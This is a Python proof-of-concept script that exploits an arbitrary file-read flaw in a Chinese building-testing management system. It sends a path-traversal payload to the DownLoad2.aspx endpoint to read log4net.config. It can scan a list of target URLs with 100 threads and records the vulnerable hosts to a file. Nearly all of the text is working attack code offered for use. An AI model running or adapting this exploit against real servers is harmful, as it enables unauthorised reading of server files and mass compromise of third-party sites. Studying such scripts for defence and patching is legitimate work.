import argparse,requests,sys,time,re,json
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test ="""
██████╗  ██████╗ ██╗    ██╗███╗   ██╗██╗      ██████╗  █████╗ ██████╗ ██████╗     █████╗ ███████╗██████╗ ██╗  ██╗
██╔══██╗██╔═══██╗██║    ██║████╗  ██║██║     ██╔═══██╗██╔══██╗██╔══██╗╚════██╗   ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║██║     ██║   ██║███████║██║  ██║ █████╔╝   ███████║███████╗██████╔╝ ╚███╔╝ 
██║  ██║██║   ██║██║███╗██║██║╚██╗██║██║     ██║   ██║██╔══██║██║  ██║██╔═══╝    ██╔══██║╚════██║██╔═══╝  ██╔██╗ 
██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗╚██████╔╝██║  ██║██████╔╝███████╗██╗██║  ██║███████║██║     ██╔╝ ██╗
╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝                                                                                                                                                                                                                                                                                        

"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞POC")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    api_payload = "/Common/DownLoad2.aspx"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:126.0)Gecko/20100101Firefox/126.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate,br',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'30',
    }
    data = "path=..%2Flog4net.config&Name="
    try:
        res1 = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        if res1.status_code==200 and '<log4net>' in res1.text:
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")